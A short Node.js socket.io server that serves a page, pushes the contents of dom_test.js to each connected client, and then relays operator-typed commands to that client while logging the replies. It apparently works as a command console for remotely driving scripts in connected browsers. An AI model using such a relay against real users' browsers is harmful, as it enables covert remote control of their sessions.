var app = require('express')();
var http = require('http').Server(app);
var io = require('socket.io')(http);
var readline = require('readline');
var fs = require('fs');

rl = readline.createInterface(process.stdin, process.stdout);

app.get('/', function(req, res){
  res.sendFile(__dirname + '/index.html');
});

io.on('connection', function(socket){
  console.log('[#] User connected: ...');

  console.log("[#] Loading auxillary modules..");
  fs.readFile('dom_test.js', 'utf-8', function(err, contents){
    console.log(contents);
    socket.emit("cmd", contents);
  });

  rl.setPrompt('[#] ');
  rl.prompt();
  
  console.log('Ready to receive command');
  rl.on('line', function(cmd) {
      socket.emit("cmd", cmd);
      rl.prompt();
    }).on('close', function() {
        console.log('Have a great day!');
        process.exit(0);
    });
  socket.on('msg', function(msg){
    console.log(msg);
  });
});

http.listen(3000, function(){
  console.log('listening on *:3000');
});
